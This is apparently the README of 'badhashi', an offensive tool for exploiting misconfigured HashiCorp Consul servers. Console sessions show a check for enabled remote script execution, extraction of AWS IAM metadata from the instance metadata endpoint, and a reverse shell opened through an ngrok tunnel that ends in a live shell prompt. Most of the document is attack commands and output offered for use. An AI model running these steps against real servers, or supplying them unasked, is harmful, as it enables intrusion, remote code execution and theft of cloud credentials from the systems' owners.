# badhashi
Scanning / Exploiting vulnerable hashicorp tools

![](https://github.com/grines/hashiscan/blob/main/badhashi.gif)

# Features Consul
- [X] AWS Meta data extraction
- [X] Status (Check if vulnerable
- [X] Reverse shell
- [ ] Custom payload
- [ ] scanning for vulnerable servers

# Features Nomad (Coming soon)
- [ ] AWS Meta data extraction
- [ ] Status (Check if vulnerable
- [ ] Reverse shell ( Raw_exec/ exec / docker)
- [ ] Custom payload
- [ ] scanning for vulnerable servers

# How
Start ngrok
./ngrok tcp 9000

```console
Connected <http://127.0.0.1:8500>$ check status
DisableRemoteExec: true
EnableRemoteScriptChecks: true
NodeName: mini.hsd1.wa.comcast.net
Version: 1.9.3
Server: true
```

```console
Connected <http://127.0.0.1:8500>$ exploit metadata
----
Check Registered
Waiting for command to register...
ID: Test
HTTP GET http://169.254.169.254/latest/meta-data/iam/info: 200 OK Output: {
  "Code" : "Success",
  "LastUpdated" : "2021-02-25T06:15:20Z",
  "InstanceProfileArn" : "arn:aws:iam::*************************************",
  "InstanceProfileId" : "AIPA2LE*************"
}
Check Deregistered
---
```

(cmd ngrok-host ngrok-port local-port) ** can replace ngrok with external ip.
```console
Connected <http://127.0.0.1:8500>$ exploit shell 2.tcp.ngrok.io 18563 9000
----
Check Registered
Waiting for callback...
2021/02/24 23:16:21 Listening on localhost:9000
Check Deregistered
---
Client 127.0.0.1:51771 connected.
bash-$: whoami
brian
```